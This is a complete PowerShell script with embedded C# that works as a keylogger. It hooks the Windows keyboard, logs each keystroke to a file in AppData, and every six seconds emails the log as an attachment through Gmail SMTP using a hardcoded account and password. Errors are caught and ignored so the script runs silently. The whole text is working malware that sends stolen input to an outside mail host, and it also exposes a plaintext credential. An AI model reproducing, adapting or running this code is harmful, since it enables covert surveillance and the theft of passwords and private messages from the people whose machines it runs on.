Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;

public class KeyLogger {
    private static StreamWriter logWriter;
    private static IntPtr hookId = IntPtr.Zero;

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static LowLevelKeyboardProc proc = HookCallback;

    public static void Start() {
        logWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\keys.txt", true);
        hookId = SetHook(proc);
        Application.Run();
        UnhookWindowsHookEx(hookId);
        logWriter.Close();
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)0x100) { // WM_KEYDOWN
            int vkCode = Marshal.ReadInt32(lParam);
            logWriter.WriteLine(((Keys)vkCode).ToString());
            logWriter.Flush();
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@ -ReferencedAssemblies "System.Windows.Forms", "System.Drawing"


$EmailTimer = New-Object Timers.Timer
$EmailTimer.Interval = 6000 
$EmailTimer.AutoReset = $true
$EmailTimer.Enabled = $true


Register-ObjectEvent -InputObject $EmailTimer -EventName Elapsed -Action {
    try {
        $logFile  = "$env:APPDATA\keys.txt"
        $tempCopy = "$env:APPDATA\keysCopy.txt"

        Copy-Item -Path $logFile -Destination $tempCopy -Force

        $smtpServer = "smtp.gmail.com"
        $smtpFrom   = "testingKL250@gmail.com"
        $smtpTo     = "testingKL250@gmail.com"
        $smtpUser   = "testingKL250@gmail.com"
        $smtpPass   = "Carsnick8*"  # Make sure this is an App Password
        $subject    = "Keylog Report - $(Get-Date -Format 'g')"
        $body       = "Attached are the recent Keystrokes"

        Send-MailMessage -From $smtpFrom -To $smtpTo -Subject $subject -Body $body -SmtpServer $smtpServer `
            -Port 587 -UseSsl `
            -Credential (New-Object System.Management.Automation.PSCredential($smtpUser, (ConvertTo-SecureString $smtpPass -AsPlainText -Force))) `
            -Attachments $tempCopy
    }
    catch {
        
    }
}

[KeyLogger]::Start()